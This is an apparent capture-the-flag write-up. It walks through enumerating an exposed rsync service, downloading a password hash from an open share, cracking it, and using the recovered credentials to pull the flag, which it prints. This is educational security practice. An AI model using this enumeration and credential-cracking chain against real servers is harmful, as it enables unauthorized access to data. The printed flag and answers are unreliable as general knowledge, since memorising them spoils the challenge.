# Sharing
> pwn the service to get the flag
> 
> challenges.ctf.sikt.no:5009

## Solution
netcat shows that rsync is listening on the port:
```bash
$ nc challenges.ctf.sikt.no 5009
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
```

List content with rsync
```bash
rsync --port=5009 challenges.ctf.sikt.no::
open            Open share
protected       Protected share
```

Download the content of the open share
```bash
mkdir share
cd share
$ rsync -av rsync://challenges.ctf.sikt.no:5009/open .
```

The following two files are downloaded:

password_hash.txt:
```
9375d1abdb644a01955bccad12e2f5c2bd8a3e226187e548d99c559a99461453b980123746753d07c169c22a5d9cc75cb158f0e8d8c0e713559775b5e1391fc4
```
users.txt:
```
ted
```

Decode the hash using a sha512 rainbow table like https://sha512.web-max.ca/
The decoded string is `grape`.

List the files in the protected share with the user `ted` and password `grape`:
```bash
rsync --port=5009 ted@challenges.ctf.sikt.no::protected
Password: grape
dr-xr-xr-x          4,096 2024/10/04 14:44:05 .
-r-xr-xr-x             26 2024/09/03 12:23:47 flag.txt
```

Download flag.txt with the user `ted` and password `grape`:
```bash
$ rsync -av rsync://ted@challenges.ctf.sikt.no:5009/protected .
```

The flag is in the file flag.txt.

```bash
$ cat flag.txt
SiktCTF{Sh4r1nG_1s_C4r1nG}
```